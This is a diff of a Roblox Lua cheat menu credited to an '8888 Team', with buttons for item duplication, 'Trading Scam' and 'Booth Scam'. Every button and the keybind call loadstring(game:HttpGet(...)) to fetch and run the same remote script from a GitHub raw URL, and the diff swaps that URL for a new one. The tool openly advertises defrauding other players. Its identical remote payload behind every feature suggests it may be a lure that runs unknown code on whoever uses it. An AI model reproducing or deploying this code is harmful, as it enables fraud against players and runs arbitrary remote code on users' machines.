@@ -7,17 +7,17 @@ local Tab = Window:MakeTab({
         PremiumOnly = false
     })
     
-    Tab:AddParagraph("Made By 8888 Team","Owner: partner#5193 | Developer's: Masqta_#688,")
+    Tab:AddParagraph("Made By 8888 Team","Owner: partner#5193 | Developer's: Masqta_#6880")
     
      local Section = Tab:AddSection({
         Name = "Status"
     })
     
-     Tab:AddLabel("Dupe: Online")
+     Tab:AddLabel("Dupe: ✅")
 
-    Tab:AddLabel("Trade Scam: Online")
+    Tab:AddLabel("Trade Scam: ✅")
     
-    Tab:AddLabel("Booth Scam: Online")
+    Tab:AddLabel("Booth Scam: ✅")
     
      local Section = Tab:AddSection({
         Name = "Update Logs"
@@ -45,7 +45,7 @@ local Tab = Window:MakeTab({
     Tab:AddButton({
         Name = "(RISK) Start Dupe",
         Callback = function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/info1.lua/main/info1.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
           end    
     })
     
@@ -105,7 +105,7 @@ local Tab = Window:MakeTab({
         Name = "Trading Scam - BETA 1.1",
         Default = false,
         Callback = function(Value)
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/info1.lua/main/info1.lua"))()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
         end    
     })
         
@@ -149,7 +149,7 @@ local Tab = Window:MakeTab({
     Tab:AddButton({
         Name = "Booth Scam",
         Callback = function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/info1.lua/main/info1.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
           end
     })
     
@@ -162,7 +162,7 @@ local Tab = Window:MakeTab({
 	Default = Enum.KeyCode.E,
 	Hold = false,
 	Callback = function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/info1.lua/main/info1.lua"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Partner12398/8888Team/main/lua1.lua"))()
 	end    
 })
 
